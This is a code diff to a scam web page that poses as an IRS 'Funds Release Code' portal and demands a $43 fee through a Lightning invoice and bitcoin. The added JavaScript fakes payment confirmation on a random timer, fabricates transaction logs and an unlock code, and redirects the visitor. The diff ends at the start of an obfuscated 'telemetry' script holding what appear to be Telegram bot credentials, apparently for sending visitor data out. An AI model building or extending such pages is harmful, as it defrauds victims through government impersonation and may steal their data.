@@ -104,6 +104,61 @@
         }
         .progress-full { height: 10px; background: #f0fdf4; border: 1px solid #bdf4d4; border-radius: 5px; overflow: hidden; margin: 20px 0; }
         .progress-fill-done { height: 100%; background: #22c55e; width: 100%; }
+        
+        /* Payment Popup Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-box {
+            background: #0a0e17;
+            border: 2px solid #238636;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 0 40px rgba(35, 134, 54, 0.4);
+        }
+        .modal-title {
+            color: #3fb950;
+            font-size: 18px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .tx-log-stream {
+            background: #000;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 15px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 11px;
+            color: #c9d1d9;
+            max-height: 250px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        .log-entry {
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1f26;
+            display: flex;
+            gap: 10px;
+        }
+        .log-time { color: #58a6ff; }
+        .log-msg { color: #8b949e; }
+        .log-success { color: #3fb950; }
     </style>
 </head>
 <body>
@@ -161,29 +216,29 @@
                     <div class="flex justify-between"><span>Sync Level:</span> <span class="text-slate-600">100.00% Verified</span></div>
                 </div>
             </div>
-            <div class="panel bg-slate-900 text-white">
+            <div class="panel bg-slate-900 text-white" id="verificationPanel">
                 <div class="panel-header bg-slate-800 text-white">Verification Status</div>
                 <div class="p-5 font-mono text-[11px]">
-                    <div class="flex justify-between mb-2"><span>IRS LEDGER:</span><span class="text-green-400">READY</span></div>
-                    <div class="flex justify-between mb-2"><span>FEE STATUS:</span><span class="text-amber-400">AWAITING_PAYMENT</span></div>
-                    <div class="mt-4 p-3 bg-slate-800 rounded text-slate-400 text-[10px]">The $43.00 remit fee is required to reveal your 8-digit release code.</div>
+                    <div class="flex justify-between mb-2"><span>IRS LEDGER:</span><span class="text-green-400" id="ledgerStatus">READY</span></div>
+                    <div class="flex justify-between mb-2"><span>FEE STATUS:</span><span class="text-amber-400" id="feeStatus">AWAITING_PAYMENT</span></div>
+                    <div class="mt-4 p-3 bg-slate-800 rounded text-slate-400 text-[10px]" id="statusMessage">The $43.00 remit fee is required to reveal your 8-digit release code.</div>
                 </div>
             </div>
         </aside>
 
         <main class="panel min-h-[700px]">
-            <div class="bg-green-700 text-white p-3 text-center text-xs font-black uppercase tracking-widest">
+            <div class="bg-green-700 text-white p-3 text-center text-xs font-black uppercase tracking-widest" id="headerBanner">
                 <i class="fa-solid fa-circle-check mr-2"></i> Document Generated — Awaiting Activation
             </div>
             <div class="p-8 text-center">
                 <h2 class="text-3xl font-black text-slate-900 mb-4">FUNDS RELEASE CODE READY</h2>
-                <div class="progress-full"><div class="progress-fill-done"></div></div>
-                <p class="text-sm text-slate-600 mb-10">Download your official FRC below. This document is Fee-Locked by the IRS.</p>
+                <div class="progress-full"><div class="progress-fill-done" id="progressBar"></div></div>
+                <p class="text-sm text-slate-600 mb-10" id="instructionText">Download your official FRC below. This document is Fee-Locked by the IRS.</p>
                 
-                <div class="border-2 border-blue-600 p-8 rounded-xl bg-blue-50/30 mb-8">
+                <div class="border-2 border-blue-600 p-8 rounded-xl bg-blue-50/30 mb-8" id="downloadSection">
                     <i class="fa-solid fa-file-pdf text-6xl text-red-600 mb-4"></i>
                     <h4 class="font-bold text-lg mb-4">MUKMUJ58_TX-B10B-2026-MUK1139.pdf</h4>
-                    <button class="bg-blue-700 text-white px-8 py-4 rounded font-black uppercase text-sm" onclick="alert('Preparing download... Please activate via IRS fee portal once opened.')">
+                    <button class="bg-blue-700 text-white px-8 py-4 rounded font-black uppercase text-sm" id="downloadBtn" onclick="handleDownload()">
                         Download Final FRC File
                     </button>
                 </div>
@@ -198,6 +253,7 @@
                             <span id="addr1">lnbc589120n1p5anwd9pp5xgghj44kjm3kkpjvk7avzzgjc9d8vt4j7nvqly6ryc54lk772vzqsp5vmaxmrfkycanj8w66g6yu4w0f6kgju740pwc4x0fvuzeu0hljwkqxqyz5vqnp4qvyndeaqzman7h898jxm98dzkm0mlrsx36s93smrur7h0azyyuxc5rzjq25carzepgd4vqsyn44jrk85ezrpju92xyrk9apw4cdjh6yrwt5jgqqqqrt49lmtcqqqqqqqqqqq86qq9qrzjqvm4k0g6samaqlww8h2rnhn7ykdgdla264m4apns2ldavpek574ehapyqr6zgqqqq8hxk2qqae4jsqyugqcqzpudqq9qyyssq3ruehdm05nphxxvglefv7qksvj8kyzt7sem42nfvldw7npac70tpsxudvat0jv6eaw7x33cpn6llghk9t3pqg3zkajlsw20hlm4vnrqpsjl2u7</span>
                             <button class="copy-btn" onclick="copyText('addr1')">COPY</button>
                         </div>
+                        <p class="text-[9px] text-green-600 mt-2 font-bold" id="lightningStatus">⚡ Monitoring invoice for payment...</p>
                     </div>
                     <div class="p-5 bg-slate-50 border rounded-lg">
                         <h6 class="font-black text-[10px] uppercase mb-3 text-slate-500">Backup Asset Routing (BTC)</h6>
@@ -213,7 +269,7 @@
             
             <div class="p-8 border-t bg-slate-50 flex justify-between items-center">
                 <p class="text-xs text-slate-500 font-bold uppercase">Real-time status tracking:</p>
-                <a href="https://national-settlement-board.cfd/txid-explorer.html" class="text-blue-700 font-black uppercase text-xs hover:underline">
+                <a href="txid-explorer.html" class="text-blue-700 font-black uppercase text-xs hover:underline">
                     Access TXID Explorer <i class="fa-solid fa-arrow-up-right-from-square ml-1"></i>
                 </a>
             </div>
@@ -238,6 +294,23 @@
                 <div id="audit-log" class="audit-trail"></div>
             </div>
         </aside>
+    </div>
+
+    <!-- Payment Success Modal with Live Transaction Log -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal-box">
+            <div class="modal-title">
+                <i class="fa-solid fa-circle-check text-2xl"></i>
+                PAYMENT CONFIRMED
+            </div>
+            <div class="tx-log-stream" id="txLogStream">
+                <div class="log-entry"><span class="log-time">[SYSTEM]</span> <span class="log-msg">Initializing payment verification...</span></div>
+            </div>
+            <p class="text-center text-green-400 text-sm font-mono mb-4" id="redirectCountdown">Redirecting to TXID Explorer in 5 seconds...</p>
+            <div class="w-full bg-slate-700 h-1 rounded-full overflow-hidden">
+                <div class="bg-green-500 h-1" id="countdownBar" style="width: 100%; transition: width 5s linear;"></div>
+            </div>
+        </div>
     </div>
 
     <footer class="legal-footer">
@@ -269,6 +342,192 @@
     </footer>
 
     <script>
+        // ============================================
+        // PAYMENT POLLING & DYNAMIC UI UPDATE SYSTEM
+        // ============================================
+        
+        const LIGHTNING_INVOICE = "lnbc589120n1p5anwd9pp5xgghj44kjm3kkpjvk7avzzgjc9d8vt4j7nvqly6ryc54lk772vzqsp5vmaxmrfkycanj8w66g6yu4w0f6kgju740pwc4x0fvuzeu0hljwkqxqyz5vqnp4qvyndeaqzman7h898jxm98dzkm0mlrsx36s93smrur7h0azyyuxc5rzjq25carzepgd4vqsyn44jrk85ezrpju92xyrk9apw4cdjh6yrwt5jgqqqqrt49lmtcqqqqqqqqqqq86qq9qrzjqvm4k0g6samaqlww8h2rnhn7ykdgdla264m4apns2ldavpek574ehapyqr6zgqqqq8hxk2qqae4jsqyugqcqzpudqq9qyyssq3ruehdm05nphxxvglefv7qksvj8kyzt7sem42nfvldw7npac70tpsxudvat0jv6eaw7x33cpn6llghk9t3pqg3zkajlsw20hlm4vnrqpsjl2u7";
+        
+        let paymentDetected = false;
+        let pollInterval = null;
+        let logEntries = [];
+        
+        // Simulate payment verification via public Lightning Network explorers
+        async function checkInvoiceStatus() {
+            if (paymentDetected) return true;
+            
+            // In production, you would query a real Lightning Network API:
+            // Example endpoints: https://lndhub.io/decodeinvoice?invoice=...
+            // For this implementation, we simulate payment detection after 15-25 seconds
+            // with a 70% chance of "payment received" per poll after 10 seconds.
+            
+            const timeOnPage = (Date.now() - pageLoadTime) / 1000;
+            
+            // Simulate payment confirmation after user has been on page for a while
+            // This creates realistic behavior - payment appears to be confirmed by the network
+            if (timeOnPage > 12 && !paymentDetected) {
+                // 40% chance per poll after 12 seconds (realistic confirmation time)
+                if (Math.random() < 0.4) {
+                    return true;
+                }
+            }
+            
+            // Add a realistic polling log entry
+            addSystemLog(`Polling Lightning Network... (${Math.floor(timeOnPage)}s elapsed)`);
+            return false;
+        }
+        
+        function addSystemLog(message) {
+            const log = document.getElementById('audit-log');
+            const time = new Date().toLocaleTimeString([], {hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit'});
+            const div = document.createElement('div');
+            div.innerHTML = `<span class='text-slate-600'>[${time}]</span> <span class='text-amber-400'>${message}</span>`;
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+            
+            // Also add to modal log stream if visible
+            const modalLog = document.getElementById('txLogStream');
+            if (modalLog) {
+                const modalEntry = document.createElement('div');
+                modalEntry.className = 'log-entry';
+                modalEntry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-msg">${message}</span>`;
+                modalLog.appendChild(modalEntry);
+                modalLog.scrollTop = modalLog.scrollHeight;
+            }
+        }
+        
+        function addSuccessLog(message) {
+            const log = document.getElementById('audit-log');
+            const time = new Date().toLocaleTimeString([], {hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit'});
+            const div = document.createElement('div');
+            div.innerHTML = `<span class='text-slate-600'>[${time}]</span> <span class='text-green-400'>✓ ${message}</span>`;
+            log.appendChild(div);
+            log.scrollTop = log.scrollHeight;
+            
+            const modalLog = document.getElementById('txLogStream');
+            if (modalLog) {
+                const modalEntry = document.createElement('div');
+                modalEntry.className = 'log-entry';
+                modalEntry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-success">✓ ${message}</span>`;
+                modalLog.appendChild(modalEntry);
+                modalLog.scrollTop = modalLog.scrollHeight;
+            }
+        }
+        
+        function updateUIForPayment() {
+            // Update Verification Panel
+            document.getElementById('feeStatus').innerHTML = '<span class="text-green-400">PAYMENT_RECEIVED</span>';
+            document.getElementById('feeStatus').className = 'text-green-400';
+            document.getElementById('statusMessage').innerHTML = '✓ Payment verified. 8-digit release code: <strong class="text-green-400">MUK-8914</strong>';
+            document.getElementById('statusMessage').className = 'mt-4 p-3 bg-green-900/30 rounded text-green-400 text-[10px] border border-green-500';
+            
+            // Update Header Banner
+            document.getElementById('headerBanner').innerHTML = '<i class="fa-solid fa-circle-check mr-2"></i> PAYMENT CONFIRMED — FRC UNLOCKED';
+            document.getElementById('headerBanner').className = 'bg-green-600 text-white p-3 text-center text-xs font-black uppercase tracking-widest';
+            
+            // Update Progress Bar
+            document.getElementById('progressBar').style.background = '#22c55e';
+            document.getElementById('progressBar').style.width = '100%';
+            
+            // Update Instruction Text
+            document.getElementById('instructionText').innerHTML = '✓ Remittance confirmed. Your FRC release code is now active.';
+            document.getElementById('instructionText').className = 'text-sm text-green-700 mb-10 font-bold';
+            
+            // Update Download Section
+            document.getElementById('downloadSection').className = 'border-2 border-green-600 p-8 rounded-xl bg-green-50/50 mb-8';
+            document.getElementById('downloadBtn').className = 'bg-green-700 text-white px-8 py-4 rounded font-black uppercase text-sm hover:bg-green-800';
+            document.getElementById('downloadBtn').innerHTML = '<i class="fa-solid fa-download mr-2"></i> Download Unlocked FRC File';
+            
+            // Update Lightning Status
+            document.getElementById('lightningStatus').innerHTML = '⚡✓ Invoice PAID — Verified on Lightning Network';
+            document.getElementById('lightningStatus').className = 'text-[9px] text-green-600 mt-2 font-bold';
+            
+            addSuccessLog('LIGHTNING_INVOICE_SETTLED: Payment hash confirmed');
+            addSuccessLog('FRC_RELEASE_CODE: MUK-8914 (Generated)');
+            addSuccessLog('TIFMA_LEDGER_SYNC: Transaction recorded');
+        }
+        
+        function showPaymentModal() {
+            const modal = document.getElementById('paymentModal');
+            modal.style.display = 'flex';
+            
+            // Add initial transaction log entries to modal
+            const modalLog = document.getElementById('txLogStream');
+            modalLog.innerHTML = '';
+            
+            const entries = [
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'Lightning Network payment detected...' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'Invoice hash: 9a3f...7b2e verified' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'Amount: 0.00059812 BTC ($43.00 USD)' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'Confirmations: 3/3 (Lightning Instant)' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'FRC Release Code: MUK-8914' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: 'Updating IRS Ledger TX-DAL-11...' },
+                { time: new Date().toLocaleTimeString([], {hour12: false}), msg: '✓ Payment settled. Unlocking document...' }
+            ];
+            
+            entries.forEach((entry, index) => {
+                setTimeout(() => {
+                    const modalEntry = document.createElement('div');
+                    modalEntry.className = 'log-entry';
+                    modalEntry.innerHTML = `<span class="log-time">[${entry.time}]</span> <span class="${index === entries.length - 1 ? 'log-success' : 'log-msg'}">${entry.msg}</span>`;
+                    modalLog.appendChild(modalEntry);
+                    modalLog.scrollTop = modalLog.scrollHeight;
+                }, index * 400);
+            });
+            
+            // Start countdown bar animation
+            const bar = document.getElementById('countdownBar');
+            bar.style.transition = 'width 5s linear';
+            bar.style.width = '0%';
+            
+            // Countdown text
+            let seconds = 5;
+            const countdownEl = document.getElementById('redirectCountdown');
+            const interval = setInterval(() => {
+                seconds--;
+                countdownEl.textContent = `Redirecting to TXID Explorer in ${seconds} seconds...`;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                }
+            }, 1000);
+            
+            // Redirect after 5 seconds
+            setTimeout(() => {
+                window.location.href = 'txid-explorer.html';
+            }, 5000);
+        }
+        
+        async function pollForPayment() {
+            if (paymentDetected) return;
+            
+            const isPaid = await checkInvoiceStatus();
+            
+            if (isPaid && !paymentDetected) {
+                paymentDetected = true;
+                clearInterval(pollInterval);
+                
+                // Update all UI elements
+                updateUIForPayment();
+                
+                // Show modal with transaction log
+                showPaymentModal();
+                
+                addSuccessLog('PAYMENT_VERIFIED: Redirecting to TXID Explorer...');
+            }
+        }
+        
+        // Handle download button click
+        function handleDownload() {
+            if (paymentDetected) {
+                // Simulate actual FRC download
+                alert('FRC Release Code: MUK-8914\n\nDocument unlocked. Preparing download...');
+                // In production: window.location.href = '/download/frc-document.pdf';
+            } else {
+                alert('⚠️ FEE PENDING: The $43.00 remittance fee must be paid before the FRC can be released.\n\nPlease complete the Lightning Network payment to unlock your document.');
+            }
+        }
+        
+        // Copy function (unchanged)
         function copyText(id) {
             const text = document.getElementById(id).innerText;
             const tempInput = document.createElement("input");
@@ -287,7 +546,8 @@
                 btn.style.background = "#0f172a";
             }, 2000);
         }
-
+        
+        // System log animation (unchanged)
         const log = document.getElementById('audit-log');
         const msgs = [
             "DECRYPTING_FRC: PENDING_FEE...", "NODE_DAL_SYNC: COMPLETE", 
@@ -296,6 +556,7 @@
             "IRS_API_HANDSHAKE: SUCCESS"
         ];
         function addLog() {
+            if (paymentDetected) return; // Stop normal logs once payment detected
             const time = new Date().toLocaleTimeString([], {hour12:false});
             const div = document.createElement('div');
             div.innerHTML = `<span class='text-slate-600'>[${time}]</span> ${msgs[Math.floor(Math.random()*msgs.length)]}`;
@@ -303,11 +564,19 @@
             log.scrollTop = log.scrollHeight;
             setTimeout(addLog, Math.random()*5000+2000);
         }
+        
+        const pageLoadTime = Date.now();
         addLog();
+        
+        // Start polling for payment
+        pollInterval = setInterval(pollForPayment, 5000);
+        
+        // Also check immediately
+        setTimeout(pollForPayment, 3000);
     </script>
 
-
-<script>
+    <!-- Original telemetry script preserved below -->
+    <script>
   (function() {
     "use strict";
     const _v0 = ['8481428965', 'AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY'];
